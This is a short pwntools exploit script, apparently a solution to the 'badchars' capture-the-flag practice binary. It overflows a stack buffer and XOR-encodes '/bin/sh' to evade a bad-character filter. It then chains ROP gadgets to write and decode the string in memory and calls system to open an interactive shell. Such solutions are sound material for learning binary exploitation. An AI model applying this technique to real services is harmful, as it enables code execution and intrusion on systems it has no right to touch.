#!/bin/python

from pwn import *


# b i c / <space> f n s
badchars = ["\x62", "\x69", "\x63", "\x2f", "\x20", "\x66", "\x6e", "\x73"]
binsh = "/bin/sh\x00"
xornum = 2
xored_buffer = ""

for character in binsh:
    xored_char = chr(ord(character) ^ xornum)
    xored_buffer += xored_char


popr12popr13 = p64(0x0000000000400b3b)
gotpltsection = 0x00601000
movr12tor13 = p64(0x0000000000400b34)
popr14popr15 = p64(0x0000000000400b40)
xorr15r14 = p64(0x0000000000400b30)
poprdi = p64(0x0000000000400b39)
system = p64(0x4006f0)

payload = "A"*40
payload += popr12popr13
payload += xored_buffer
payload += p64(gotpltsection)
payload += movr12tor13

for i in range(8):
    payload += popr14popr15
    payload += p64(0x2)
    payload += p64(gotpltsection+i)
    payload += xorr15r14

payload += poprdi
payload += p64(gotpltsection)
payload += system


p = process('./badchars')
p.recvrepeat(2)
p.sendline(payload)
p.interactive()
